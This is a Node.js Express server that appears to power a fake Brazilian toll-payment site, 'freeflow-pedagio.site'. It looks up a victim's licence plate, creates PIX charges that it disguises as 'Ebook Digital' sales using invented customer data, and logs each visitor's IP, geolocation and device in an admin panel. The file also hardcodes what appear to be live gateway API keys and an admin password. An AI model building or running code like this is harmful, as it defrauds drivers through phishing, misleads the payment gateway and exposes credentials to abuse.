const express = require('express');
const cors = require('cors');

const app = express();

const ALLOWED_ORIGINS = [
    'https://www.freeflow-pedagio.site',
    'https://freeflow-pedagio.site',
];

const INTERNAL_KEY = process.env.INTERNAL_KEY || 'fd-k9x2mq7v4n8p1w6j3t5r';

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
        return cb(new Error('Not allowed'));
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Internal-Key'],
}));

app.use(express.json());

// Block direct browser access to API routes
function requireInternalKey(req, res, next) {
    const key = req.headers['x-internal-key'];
    if (key !== INTERNAL_KEY) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

const MANGOFY_API_KEY = process.env.MANGOFY_API_KEY || '2cb435b12f2f8431fbd9b7e1f0b34540e2axyl1axlbg34ckxjxaxvbyool0oen';
const MANGOFY_STORE_CODE = process.env.MANGOFY_STORE_CODE || 'd2b22f8faf5a2081e772328755ce7349';
const MANGOFY_API_URL = 'https://checkout.mangofy.com.br/api/v1';

// ---------- GERAR PIX ----------
app.post('/api/gerar_pix', requireInternalKey, async (req, res) => {
    const { valorTransacao, placa } = req.body || {};
    const valor = parseFloat(valorTransacao) || 0;
    const placaClean = (placa || '').toUpperCase().trim();

    if (valor <= 0 || !placaClean) {
        return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }

    const valorCentavos = Math.round(valor * 100);
    if (valorCentavos < 500) {
        return res.status(400).json({ success: false, error: 'Valor mínimo é R$ 5,00' });
    }

    const payload = {
        payment_method: 'pix',
        payment_format: 'regular',
        installments: 1,
        payment_amount: valorCentavos,
        postback_url: (process.env.RAILWAY_PUBLIC_DOMAIN
            ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN
            : 'https://localhost:3000') + '/api/webhook',
        external_code: 'PED_' + Math.random().toString(36).substring(2,10).toUpperCase() + '_' + Date.now(),
        items: [{
            code: 'EBOOK_' + Date.now(),
            name: 'Ebook Digital',
            amount: valorCentavos,
            total: 1,
        }],
        customer: {
            email: 'user_' + Math.random().toString(36).substring(2,10) + '@gmail.com',
            name: 'Cliente #' + Math.random().toString(36).substring(2,8).toUpperCase(),
            document: '00000000000',
            phone: '11999999999',
            ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '177.70.100.1',
        },
        pix: { expires_in_days: 1 },
    };

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment', {
            method: 'POST',
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        const data = await response.json();

        if (response.ok && data.payment_code) {
            const pix = data.pix || data.checkout || {};
            const qrcode = pix.pix_qrcode_text || pix.qr_code || pix.qrcode || pix.emv || pix.brcode || pix.code
                || data.qr_code || data.qrcode || data.emv || data.brcode || '';
            const qrcodeBase64 = pix.qr_code_base64 || pix.qrcode_base64 || pix.image || pix.base64
                || data.qr_code_base64 || data.qrcode_base64 || data.image || '';

            return res.json({
                success: true,
                transaction_id: data.payment_code,
                qrcode,
                qrcode_base64: qrcodeBase64,
                valor,
            });
        }

        return res.status(400).json({
            success: false,
            error: data.message || data.error || 'Erro ao gerar PIX',
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão com gateway' });
    }
});

// ---------- CONSULTAR STATUS ----------
app.post('/api/consultar_status_pix', requireInternalKey, async (req, res) => {
    const { transaction_id } = req.body || {};
    const paymentCode = (transaction_id || '').trim();

    if (!paymentCode) {
        return res.status(400).json({ success: false, error: 'transaction_id é obrigatório' });
    }

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment/' + encodeURIComponent(paymentCode), {
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

        const data = await response.json();

        if (response.ok && data) {
            const statusMap = { approved: 'paid', pending: 'pending', refunded: 'refunded', error: 'error' };
            const status = statusMap[data.payment_status] || 'pending';
            return res.json({
                success: true,
                status,
                paid_at: data.payment_status === 'approved' ? (data.approved_at || new Date().toISOString()) : null,
            });
        }

        return res.json({ success: true, status: 'pending', paid_at: null });
    } catch (e) {
        return res.json({ success: true, status: 'pending', paid_at: null });
    }
});

// ---------- VEICULOS ----------
app.get('/api/veiculos', requireInternalKey, async (req, res) => {
    const placa = (req.query.placa || '').toUpperCase().trim();

    if (!placa || !/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
        return res.status(400).json({ success: false, error: 'Placa inválida' });
    }

    try {
        const response = await fetch('https://www.achecar.com.br/api/free-lookup', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.achecar.com.br',
                'Referer': 'https://www.achecar.com.br/consulta-gratuita',
            },
            body: JSON.stringify({ plate: placa }),
        });

        if (!response.ok) return res.status(502).json({ success: false, error: 'Consulta falhou' });

        const data = await response.json();
        if (!data.brand && !data.model) return res.status(404).json({ success: false, error: 'Não encontrado' });

        return res.json({
            success: true,
            veiculo: {
                marca: data.brand || '', modelo: data.model || '', descricao: data.brandModel || '',
                ano: data.year || '', anoModelo: data.yearModel || '', cor: data.color || '',
                combustivel: data.fuel || '', tipo: data.vehicleType || '',
                cidade: data.city || '', estado: data.state || '', potencia: data.power || '',
                nacionalidade: data.nationality || '',
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão' });
    }
});

// ---------- PERSISTENT STORAGE ----------
const fs = require('fs');
const DATA_FILE = '/tmp/freeflow-events.json';

let events = [];
try {
    if (fs.existsSync(DATA_FILE)) {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        events = JSON.parse(raw);
        console.log('[BOOT] Loaded', events.length, 'events from disk');
    }
} catch (e) { events = []; }

function saveEvents() {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(events), 'utf8'); } catch (_) {}
}

// ---------- WEBHOOK ----------
app.post('/api/webhook', (req, res) => {
    const data = req.body || {};
    const code = data.payment_code || '';
    if (data.payment_status === 'approved' && code) {
        const ev = events.find(e => e.pixCode === code || e.externalCode === data.external_code);
        if (ev) { ev.pago = true; ev.pagoEm = new Date().toISOString(); saveEvents(); }
    }
    res.json({ received: true });
});

// ---------- TRACKING ----------

function spTime(iso) {
    return new Date(iso).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo', hour12: false });
}
function isMobile(ua) {
    return /android|iphone|ipad|ipod|mobile|phone/i.test(ua);
}

app.post('/api/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';
    const { tipo, pagina, placa, valor, pixCode, externalCode } = req.body || {};

    // Dedup: skip "visita" if same IP already tracked in last 30 min
    if (tipo === 'visita') {
        const cutoff = Date.now() - 30 * 60 * 1000;
        const recent = events.find(e => e.ip === ip && e.tipo === 'visita' && new Date(e.ts).getTime() > cutoff);
        if (recent) return res.json({ ok: true, dedup: true });
    }

    let geo = {};
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,lat,lon,isp`);
        if (geoRes.ok) geo = await geoRes.json();
    } catch (_) {}

    const ev = {
        id: Date.now() + Math.random(),
        tipo: tipo || 'visita',
        pagina: pagina || '',
        ip,
        pais: geo.country || '',
        estado: geo.regionName || '',
        cidade: geo.city || '',
        lat: geo.lat || null,
        lon: geo.lon || null,
        isp: geo.isp || '',
        ua,
        mobile: isMobile(ua),
        placa: placa || '',
        valor: valor || null,
        pixCode: pixCode || '',
        externalCode: externalCode || '',
        pago: false,
        pagoEm: null,
        ts: new Date().toISOString(),
    };

    events.unshift(ev);
    saveEvents();
    res.json({ ok: true });
});

// ---------- PAINEL ADMIN ----------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Br@sil2019';

app.get('/painel/export', (req, res) => {
    if (req.query.senha !== ADMIN_PASSWORD) return res.status(403).send('Forbidden');
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename="eventos.json"');
    res.send(JSON.stringify(events, null, 2));
});

app.get('/painel', (req, res) => {
    const { senha, page } = req.query;

    if (senha !== ADMIN_PASSWORD) {
        return res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso restrito</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#1e293b;border-radius:16px;padding:40px 32px;width:min(360px,92vw);box-shadow:0 20px 60px #0008}
h2{color:#fff;font-size:20px;margin-bottom:24px;text-align:center}
input{width:100%;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px 14px;color:#fff;font-size:15px;outline:none;margin-bottom:16px}
input:focus{border-color:#6366f1}
button{width:100%;background:#6366f1;color:#fff;border:none;border-radius:8px;padding:13px;font-size:15px;font-weight:700;cursor:pointer}
button:hover{background:#4f46e5}.err{color:#f87171;font-size:13px;text-align:center;margin-top:10px;display:none}
</style></head><body>
<div class="box">
  <h2>🔒 Painel Admin</h2>
  <form id="f">
    <input type="password" id="pw" placeholder="Senha" autocomplete="off">
    <button type="submit">Entrar</button>
    <p class="err" id="err">Senha incorreta</p>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(e){
  e.preventDefault();var pw=document.getElementById('pw').value;
  if(pw)window.location.href='/painel?senha='+encodeURIComponent(pw);
  else document.getElementById('err').style.display='block';
});
</script></body></html>`);
    }

    const PER_PAGE = 100;
    const currentPage = Math.max(1, parseInt(page) || 1);
    const totalPages = Math.max(1, Math.ceil(events.length / PER_PAGE));
    const pageEvents = events.slice((currentPage - 1) * PER_PAGE, currentPage * PER_PAGE);

    const total = events.length;
    const visitas = events.filter(e => e.tipo === 'visita').length;
    const pixGerados = events.filter(e => e.tipo === 'pix_gerado').length;
    const pagamentos = events.filter(e => e.pago || e.tipo === 'pagamento_confirmado').length;
    const uniqueIPs = new Set(events.map(e => e.ip)).size;

    function badgeClass(tipo) {
        if (tipo === 'visita') return 'bv';
        if (tipo === 'pix_gerado') return 'bp';
        if (tipo === 'pagamento_confirmado') return 'bc';
        return 'bv';
    }

    const rows = pageEvents.map(ev => {
        const deviceIcon = ev.mobile ? '📱' : '🖥️';
        const deviceLabel = ev.mobile ? 'Mobile' : 'Desktop';
        const loc = [ev.cidade, ev.estado, ev.pais].filter(Boolean).join(', ');
        const val = ev.valor ? 'R$ ' + parseFloat(ev.valor).toFixed(2).replace('.', ',') : '—';
        const pagoTxt = ev.pago ? `✅ ${ev.pagoEm ? spTime(ev.pagoEm) : 'Sim'}` : '—';
        const uaSafe = (ev.ua || '').replace(/</g, '&lt;');
        return `<tr>
      <td>${spTime(ev.ts)}</td>
      <td><span class="badge ${badgeClass(ev.tipo)}">${ev.tipo.replace('_',' ')}</span></td>
      <td>${ev.pagina}</td>
      <td>${ev.placa || '—'}</td>
      <td>${val}</td>
      <td>${pagoTxt}</td>
      <td>${ev.ip}</td>
      <td>${loc || '—'}</td>
      <td title="${uaSafe}">${deviceIcon} ${deviceLabel}</td>
      <td class="ua" title="${uaSafe}">${uaSafe}</td>
    </tr>`;
    }).join('');

    const encPw = encodeURIComponent(ADMIN_PASSWORD);
    const pagerLinks = [];
    for (let i = 1; i <= totalPages; i++) {
        pagerLinks.push(`<a href="/painel?senha=${encPw}&page=${i}" class="${i===currentPage?'active':''}">${i}</a>`);
    }

    res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Painel Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
.top{background:#1e293b;padding:14px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #334155;flex-wrap:wrap}
.top h1{font-size:16px;font-weight:700;flex:1}
.top a{color:#94a3b8;font-size:13px;text-decoration:none;white-space:nowrap}
.top a:hover{color:#fff}
.stats{display:flex;gap:12px;padding:16px 20px;flex-wrap:wrap}
.stat{background:#1e293b;border-radius:10px;padding:16px 20px;border:1px solid #334155;min-width:120px;flex:1}
.stat .n{font-size:28px;font-weight:900;color:#6366f1}
.stat .l{font-size:12px;color:#94a3b8;margin-top:2px}
.wrap{padding:0 20px 40px;overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:12px;table-layout:fixed}
th{background:#1e293b;padding:9px 10px;text-align:left;color:#94a3b8;font-weight:600;
   border-bottom:1px solid #334155;position:sticky;top:0;z-index:2;
   overflow:hidden;resize:horizontal;min-width:60px;white-space:nowrap}
th::after{content:'';position:absolute;right:0;top:20%;height:60%;width:3px;background:#334155;cursor:col-resize}
td{padding:8px 10px;border-bottom:1px solid #1a2535;vertical-align:middle;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
tr:hover td{background:#1a2535}
.badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:10px;font-weight:700;white-space:nowrap}
.bv{background:#1e3a5f;color:#60a5fa}
.bp{background:#1a3a2a;color:#4ade80}
.bc{background:#2d1b4e;color:#a78bfa}
.ua{font-size:10px;color:#64748b;max-width:200px}
.sub{padding:8px 20px 12px;font-size:13px;color:#64748b;display:flex;align-items:center;gap:16px}
.pager{display:flex;gap:6px;flex-wrap:wrap;padding:0 20px 20px}
.pager a{background:#1e293b;color:#94a3b8;padding:5px 11px;border-radius:6px;text-decoration:none;font-size:13px;border:1px solid #334155}
.pager a:hover{background:#334155;color:#fff}
.pager a.active{background:#6366f1;color:#fff;border-color:#6366f1}
</style></head><body>
<div class="top">
  <h1>📊 Painel Admin — freeflow-pedagio.site</h1>
  <a href="/painel?senha=${encPw}&page=${currentPage}">↻ Atualizar</a>
  <a href="/painel/export?senha=${encPw}">⬇ Exportar JSON</a>
</div>
<div class="stats">
  <div class="stat"><div class="n">${total}</div><div class="l">Total eventos</div></div>
  <div class="stat"><div class="n">${visitas}</div><div class="l">Visitas únicas</div></div>
  <div class="stat"><div class="n">${uniqueIPs}</div><div class="l">IPs únicos</div></div>
  <div class="stat"><div class="n">${pixGerados}</div><div class="l">PIX gerados</div></div>
  <div class="stat"><div class="n">${pagamentos}</div><div class="l">Pagamentos confirmados</div></div>
</div>
<div class="sub">
  Página ${currentPage} de ${totalPages} — ${total} eventos totais — Horário: São Paulo (UTC-3)
</div>
<div class="wrap">
<table>
<colgroup>
  <col style="width:130px"><col style="width:110px"><col style="width:80px"><col style="width:80px">
  <col style="width:80px"><col style="width:110px"><col style="width:110px"><col style="width:160px">
  <col style="width:80px"><col style="width:200px">
</colgroup>
<thead><tr>
  <th>Data/Hora</th><th>Tipo</th><th>Página</th><th>Placa</th>
  <th>Valor</th><th>Pago</th><th>IP</th><th>Localização</th>
  <th>Dispositivo</th><th>Navegador (UA)</th>
</tr></thead>
<tbody>${rows || '<tr><td colspan="10" style="text-align:center;padding:40px;color:#64748b">Nenhum evento ainda</td></tr>'}</tbody>
</table>
</div>
<div class="pager">${pagerLinks.join('')}</div>
</body></html>`);
});

// ---------- HEALTH (hidden) ----------
app.get('/', (req, res) => res.status(404).send('Not found'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port ' + PORT));
